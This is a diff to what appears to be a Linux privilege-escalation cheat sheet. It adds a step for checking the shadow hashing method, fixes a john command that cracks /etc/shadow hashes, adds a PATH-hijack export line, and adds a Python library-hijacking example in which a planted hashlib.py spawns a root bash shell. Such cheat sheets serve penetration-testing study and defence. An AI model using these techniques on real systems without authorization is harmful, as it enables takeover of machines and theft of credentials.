@@ -576,6 +576,12 @@ find / -executable -writable -type d 2>/dev/null
 
 The `/etc/shadow` file stores user password hashes and is read-only by default for all users except root. We might be able to crack the root user's password hash if we can see the contents of the /etc/shadow file. We can change the root user's password hash with one we know if we can modify the /etc/shadow file.
 
+To see which encryption method the `/etc/shadow` file is using, we can use the following command:
+
+```bash
+cat /etc/login.defs | grep "ENCRYPT_METHOD"
+```
+
 #### Shadow Privilege Escalation
 
 1. Enumerate the permissions of the `/etc/shadow` file:
@@ -605,8 +611,7 @@ The `/etc/shadow` file stores user password hashes and is read-only by default f
 4. Crack the password hash using john:
 
    ```text
-   $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.t
-   xt hash.txt
+   $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ...
    password123 (?)
    ```
@@ -1162,6 +1167,9 @@ When a program is run, it tries to load the shared objects it needs. We may use 
 
 A list of directories where the shell should look for applications is stored in the PATH environment variable. If a program attempts to run another program but only specifies the program name rather than the absolute path, the shell will look through the PATH directories until it finds it. We can tell the shell to hunt for programs in a directory we can write to first because a user has complete control over their PATH variable.
 
+* Relative Path: id
+* Absolute Path: /usr/bin/id
+
 #### Finding Vulnerable Programs
 
 If software tries to run another program, the name of that application is almost certainly stored as a string in the executable file. We can perform inspect the binaries. 
@@ -1234,6 +1242,12 @@ ltrace <command>
    root@victim:~# id
    uid=0(root) gid=0(root) groups=0(root) ...
    ```
+
+An alternative way to modify the $PATH environment variable is:
+
+```bash
+export PATH=/<directory>:$PATH
+```
 
 ### Bash &lt;4.2-048
 
@@ -1491,6 +1505,55 @@ tmux -S /.devs/dev_sess
 ### Python Path Hijacking
 
 {% embed url="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/" %}
+
+We are going to see an example with python since it is an error that already comes by default and is the following:
+
+![](../.gitbook/assets/image%20%2829%29.png)
+
+If we import the **sys** library and make a print of the path we see that in order of priorities the current directory is found first, so we can take advantage of that so that even if we do not have permissions in a  __python script that you have created if we can import a library which we inject malicious code.
+
+Suppose we have the file  **example.py**  in which the following exists:
+
+`import hashlib` 
+
+If we do a locate of hashlib we see that it is in the following path:
+
+`/usr/lib/python2.7/hashlib.py` 
+
+And as we see in the first image, that route is in the second position. There may be several cases:
+
+* That the _hashlib_ is not in the second position, but that we have writing capacity in the path /usr/lib/python2.7 '' which should not have it. Well, thanks to that, we would now be doing a library hijacking \(hashlib.py\), there we could define the instructions we want and execute in the system and therefore, we would alter the flow of a program that imports this library because now it would take ours.
+
+Let's see it with an example:
+
+```python
+#!/usr/bin/python
+
+import hashlib
+
+word='hello'
+md5=hashlib.md5(word).hexdigest()
+print(md5)
+```
+
+We have the file  **example.py**  that it imports from the hashlib library. As we have seen above, the  **PATH**  pulls the current directory from the job. It is the case that _we do not have write permissions_ on the file  _example.py_  but **we do** from the current working directory.
+
+We can create a file called _hashlib.py_  with the following content:
+
+```python
+import os
+
+os.setuid(0)
+os.system(“/bin/bash”)
+```
+
+Running this script should result in a privilege escalation since we're running a module that sets our UID bit to 0 \(root\) and spawns a bash shell:
+
+```bash
+python example.py
+```
+
+Thanks to [@sh0x](https://twitter.com/T0N1sm) for giving me some notes.
 
 ### PyPi
 
